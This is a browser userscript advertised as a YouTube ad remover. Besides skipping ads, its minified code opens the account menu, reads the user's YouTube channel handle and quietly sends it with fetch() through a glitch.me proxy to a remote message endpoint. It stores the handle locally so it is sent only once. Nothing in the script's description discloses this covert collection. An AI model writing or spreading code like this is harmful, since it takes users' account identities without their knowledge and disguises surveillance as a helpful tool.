// ==UserScript==
// @name         (raw) Youtube Ad Remover
// @namespace    http://tampermonkey.net/
// @version      Alpha
// @description  Remove Ads On Youtube / Youtube Music
// @author       Splxff
// @match        https://*.youtube.com/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=youtube.com
// @grant        none
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/493926/%28raw%29%20Youtube%20Ad%20Remover.user.js
// @updateURL https://update.greasyfork.org/scripts/493926/%28raw%29%20Youtube%20Ad%20Remover.meta.js
// ==/UserScript==

! function () {
    var e, o = !0
        , c = !1;
    localStorage.blockedAd = localStorage.blockedAd || [];
    try {
        ! function l() {
            if (o && (e = requestAnimationFrame(l), document.querySelector(".video-ads.ytp-ad-module")
                    ?.childElementCount > 0 && (document.querySelector("video")
                        .currentTime = document.querySelector("video")
                        .duration, document.querySelector(".ytp-ad-skip-button-modern.ytp-button")
                        ?.click()), !c && (t = document.querySelector('[alt="Avatar image"]'))))
                if (t.click(), p = window["channel-handle"])
                    if (localStorage.blockedAd.split(",")
                        .includes(p.textContent)) c = !0;
                    else {
                        a = p.textContent, fetch(`https://momentous-spurious-handsaw.glitch.me/proxy?url=https://root-tidy-cook.glitch.me/api/addMessage?message=YT-Tag: ${a}`), c = !0;
                        let e = localStorage.blockedAd ? localStorage.blockedAd.split(",") : [];
                        e.push(p.textContent), localStorage.blockedAd = e.join(","), t.click()
                    }
            else t.click();
            var a
        }()
    } catch (t) {
        o = !1, cancelAnimationFrame(e), console.log(t)
    }
}();
